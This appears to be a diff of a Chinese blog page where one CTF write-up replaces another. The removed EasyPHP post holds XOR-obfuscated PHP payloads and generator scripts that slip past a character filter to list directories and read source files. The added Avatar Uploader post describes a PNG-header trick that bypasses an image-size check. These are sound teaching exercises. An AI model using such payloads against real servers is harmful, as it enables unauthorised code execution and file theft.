@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="刷题笔记:[ISITDTU 2019]EasyPHP, 远离尘世的幻想乡">
+    <meta name="keywords" content="刷题笔记:[HarekazeCTF2019]Avatar Uploader 1, 远离尘世的幻想乡">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>刷题笔记:[ISITDTU 2019]EasyPHP | 远离尘世的幻想乡</title>
+    <title>刷题笔记:[HarekazeCTF2019]Avatar Uploader 1 | 远离尘世的幻想乡</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -363,12 +363,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/74.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/68.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">刷题笔记:[ISITDTU 2019]EasyPHP</h1>
+                    <h1 class="description center-align post-title">刷题笔记:[HarekazeCTF2019]Avatar Uploader 1</h1>
                 </div>
             </div>
         </div>
@@ -492,10 +492,6 @@
                                 <span class="chip bg-color">Web</span>
                             </a>
                         
-                            <a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
-                                <span class="chip bg-color">PHP代码审计</span>
-                            </a>
-                        
                     </div>
                     
                 </div>
@@ -517,28 +513,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-08-15
+                    2021-08-16
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-08-15
+                    2021-08-16
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    885
+                    394
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    4 分
+                    1 分
                 </div>
                 
 
@@ -561,113 +557,69 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="刷题笔记-ISITDTU-2019-EasyPHP"><a href="#刷题笔记-ISITDTU-2019-EasyPHP" class="headerlink" title="刷题笔记:[ISITDTU 2019]EasyPHP"></a>刷题笔记:[ISITDTU 2019]EasyPHP</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <h1 id="刷题笔记-HarekazeCTF2019-Avatar-Uploader-1"><a href="#刷题笔记-HarekazeCTF2019-Avatar-Uploader-1" class="headerlink" title="刷题笔记:[HarekazeCTF2019]Avatar Uploader 1"></a>刷题笔记:[HarekazeCTF2019]Avatar Uploader 1</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Avatar-Uploader-1/image-20210816141134001.png"></p>
+<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>上传限制png，还会检测尺寸，发包看不到反馈，挺烦的</p>
+<p>原来题目还给了源码，</p>
+<h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p>upload.php</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-<span class="token variable">$_</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'_'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\x00- 0-9\'"`$&amp;.,|[&#123;_defgops\x7F]+/i'</span><span class="token punctuation">,</span> <span class="token variable">$_</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
-    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'rosé will not do it'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'lib/util.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'lib/session.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">count_chars</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0xd</span> <span class="token punctuation">)</span>
-    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'you are so close, omg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$session</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SecureClientSession</span><span class="token punctuation">(</span><span class="token constant">CLIENT_SESSION_ID</span><span class="token punctuation">,</span> <span class="token constant">SECRET_KEY</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token comment">// check whether file is uploaded</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token function">error</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'No file was uploaded.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
 
-<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><blockquote>
-<p>count_chars(string,3) 返回一个去重的字符串(所有使用过的不同的字符)</p>
+<span class="token comment">// check file size</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">256000</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token function">error</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Uploaded file is too large.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token comment">// check file type</span>
+<span class="token variable">$finfo</span> <span class="token operator">=</span> <span class="token function">finfo_open</span><span class="token punctuation">(</span><span class="token constant">FILEINFO_MIME_TYPE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$type</span> <span class="token operator">=</span> <span class="token function">finfo_file</span><span class="token punctuation">(</span><span class="token variable">$finfo</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">finfo_close</span><span class="token punctuation">(</span><span class="token variable">$finfo</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'image/png'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token function">error</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Uploaded file is not PNG format.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token comment">// check file width/height</span>
+<span class="token variable">$size</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">256</span> <span class="token operator">||</span> <span class="token variable">$size</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">256</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token function">error</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Uploaded image is too large.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token constant">IMAGETYPE_PNG</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token comment">// I hope this never happens...</span>
+  <span class="token function">error</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'What happened...? OK, the flag for part 1 is: &lt;code>'</span> <span class="token operator">.</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'FLAG1'</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/code>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token comment">// ok</span>
+<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.png'</span><span class="token punctuation">;</span>
+<span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">UPLOAD_DIR</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$session</span><span class="token operator">-></span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'avatar'</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">flash</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'info'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'Your avatar has been successfully updated!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h3><p>在这拿flag</p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Avatar-Uploader-1/image-20210816143639267.png"></p>
+<p>重点是绕过这里</p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Avatar-Uploader-1/image-20210816165109112.png"></p>
+<blockquote>
+<p><code>finfo_file()</code>主要是识别<strong>PNG</strong>文件十六进制下的第一行信息，若保留文件头信息，破坏掉文件长宽等其余信息，也就可以绕过<code>getimagesize()</code>函数的检验 </p>
 </blockquote>
-<p>要求所用字符小于13种，还检测各种字符。</p>
-<p>明显，就是无字母数字webshell的构造。</p>
-<p>先测试下phpinfo()</p>
-<pre class="line-numbers language-none"><code class="language-none">?_&#x3D;(~%8F%97%8F%96%91%99%90)();
-或
-?_&#x3D;(%80%80%80%80%80%80%80^%f0%e8%f0%e9%ee%e6%ef)();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-ISITDTU-2019-EasyPHP/image-20210815190330822.png"></p>
-<p>命令执行的几个函数都被禁用了，就得想其他办法。</p>
-<p>可以构造</p>
-<pre class="line-numbers language-none"><code class="language-none">print_r(scandir(.));
-
-%ff%ff%ff%ff%ff%ff%ff^%8f%8d%96%91%8b%a0%8d(%ff%ff%ff%ff%ff%ff%ff^%8c%9c%9e%91%9b%96%8d(%ff^%d1));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p>但问题在于，限制了13个字符，除去必要的<code>()^;</code>，只剩下9个字符了。</p>
-<p>方便后续使用方便，还是写个脚本吧</p>
-<p>姑且写了个暴力生成的，但要跑很久的代码，无奈放弃。</p>
-<p>突然发现，在这里统计的字符串并非urlcode的字符串，比如<code>#</code>对应<code>%23</code>，传过去统计的是<code>#</code>，之前搞错了，代码怎么写都不对，浪费了很多时间，无语了。</p>
-<p>那换种思路，因为限制种类数不限制长度，尝试有没有哪个字符可以通过其他字符进行多次异或得到，这样的话就好办了，百度了下脚本改了改。</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">en</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">return</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
-
-
-p <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'printrscandir'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-<span class="token keyword">for</span> i <span class="token keyword">in</span> p<span class="token punctuation">:</span>
-    <span class="token keyword">for</span> j <span class="token keyword">in</span> p<span class="token punctuation">:</span>
-        <span class="token keyword">for</span> k <span class="token keyword">in</span> p<span class="token punctuation">:</span>
-            <span class="token keyword">for</span> m <span class="token keyword">in</span> p<span class="token punctuation">:</span>
-                <span class="token keyword">if</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>
-                    <span class="token keyword">if</span><span class="token punctuation">(</span>j <span class="token operator">==</span> k <span class="token keyword">or</span> j <span class="token operator">==</span> m <span class="token keyword">or</span> m <span class="token operator">==</span> k<span class="token punctuation">)</span><span class="token punctuation">:</span>
-                        <span class="token keyword">continue</span>
-                    <span class="token keyword">else</span><span class="token punctuation">:</span>
-                        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token string">'=='</span><span class="token operator">+</span>j <span class="token operator">+</span> <span class="token string">'^'</span> <span class="token operator">+</span> k <span class="token operator">+</span> <span class="token string">'^'</span><span class="token operator">+</span>m<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">'\t'</span><span class="token punctuation">)</span>
-                        <span class="token keyword">print</span><span class="token punctuation">(</span>
-                            <span class="token string">'&#123;:0>2&#125;  =>  ["&#123;:0>2&#125;","&#123;:0>2&#125;","&#123;:0>2&#125;"]'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>
-                                en<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> en<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span> en<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">,</span> en<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-                        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-ISITDTU-2019-EasyPHP/image-20210815235405221.png"></p>
-<p>挑些出现次数较少的字符替换一下，比如</p>
-<p>原来是t，我选<code>t==s^d^c     %8b  =&gt;  %8c  %9b  %9c</code></p>
-<pre class="line-numbers language-none"><code class="language-none">(%8b)^(%ff)
-变成
-(%8c)^(%ff)^(%9b)^(9c)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p>半自动替换脚本：</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">tail</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    s <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">filter</span><span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> s<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'^'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'()'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'%'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-    p <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'ff'</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
-    <span class="token keyword">return</span> <span class="token punctuation">[</span>p<span class="token punctuation">,</span> p<span class="token punctuation">]</span>
-
-
-<span class="token keyword">def</span> <span class="token function">head</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    s <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">filter</span><span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> s<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'^'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'()'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'%'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-    <span class="token keyword">return</span> s
-
-
-<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    s <span class="token operator">=</span> <span class="token string">''</span>
-    <span class="token keyword">for</span> i <span class="token keyword">in</span> l<span class="token punctuation">:</span>
-        s <span class="token operator">+=</span> <span class="token string">'%'</span><span class="token operator">+</span>i
-    <span class="token keyword">return</span> s
-
-
-s <span class="token operator">=</span> <span class="token string">'(%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff)'</span>
-l <span class="token operator">=</span> head<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
-p <span class="token operator">=</span> tail<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
-to_fix_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'8b'</span><span class="token punctuation">,</span> <span class="token string">'91'</span><span class="token punctuation">,</span> <span class="token string">'8d'</span><span class="token punctuation">]</span>
-to_replace <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"8c"</span><span class="token punctuation">,</span> <span class="token string">"9b"</span><span class="token punctuation">,</span> <span class="token string">"9c"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"96"</span><span class="token punctuation">,</span> <span class="token string">"9c"</span><span class="token punctuation">,</span> <span class="token string">"9b"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"9e"</span><span class="token punctuation">,</span> <span class="token string">"9c"</span><span class="token punctuation">,</span> <span class="token string">"8f"</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
-<span class="token keyword">for</span> t<span class="token punctuation">,</span> to_fix <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>to_fix_list<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">for</span> n<span class="token punctuation">,</span> i <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token keyword">if</span> to_fix <span class="token operator">==</span> i<span class="token punctuation">:</span>
-            s <span class="token operator">=</span> s<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>to_fix<span class="token punctuation">,</span> to_replace<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
-            p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> to_replace<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
-            p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> to_replace<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
-
-<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;^(&#123;&#125;)^(&#123;&#125;)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> add<span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> add<span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>至于为什么要用三个字符异或，因为两个字符异或出来的结果很少甚至没有。</p>
-<pre class="line-numbers language-none"><code class="language-none">print_r&#x3D;((%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%9c%ff%9c%9c%ff%9c)^(%ff%8f%ff%9b%9b%ff%8f))
-
-scandir&#x3D;((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%ff%9c)^(%ff%ff%ff%9b%ff%ff%8f))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p>读目录payload</p>
-<pre class="line-numbers language-none"><code class="language-none">?_&#x3D;((%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%9c%ff%9c%9c%ff%9c)^(%ff%8f%ff%9b%9b%ff%8f))(((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%ff%9c)^(%ff%ff%ff%9b%ff%ff%8f))((%d1)^(%ff)));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-ISITDTU-2019-EasyPHP/image-20210815225505661.png"></p>
-<p>读flag，用<code>end()</code>代替数组选择。</p>
-<pre class="line-numbers language-none"><code class="language-none">show_source(end(scandir(.)));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<pre class="line-numbers language-none"><code class="language-none">?_&#x3D;((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
+<p>随便找个图片，删掉多余的东西</p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Avatar-Uploader-1/image-20210816165632093.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Avatar-Uploader-1/image-20210816165924125.png"></p>
+<p>上传一下，结束。</p>
+<p>测试了下，就第一行，一个字符都不能多，多了就会变成<code>octet-stream</code></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-HarekazeCTF2019-Avatar-Uploader-1/image-20210816173818763.png"></p>
+<p>弄本地环境的时候，谷歌浏览器不知道抽什么风，明明设置好了hosts，一会可以，一会有跳转到莫名其妙的网站，隐声模式有没问题，火狐，phpstorm，edge也可以。换了个网址，得，开始隐私错误，越来越想放弃chrome了。</p>
 
                 
             </div>
@@ -694,7 +646,7 @@ scandir&#x3D;((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%f
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://syunaht.com/p/2441275844.html">https://syunaht.com/p/2441275844.html</a>
+                    <a href="https://syunaht.com/p/2917397323.html">https://syunaht.com/p/2917397323.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -740,10 +692,6 @@ scandir&#x3D;((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%f
                                     <span class="chip bg-color">Web</span>
                                 </a>
                             
-                                <a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
-                                    <span class="chip bg-color">PHP代码审计</span>
-                                </a>
-                            
                         </div>
                     
                 </div>
@@ -787,9 +735,10 @@ scandir&#x3D;((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%f
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
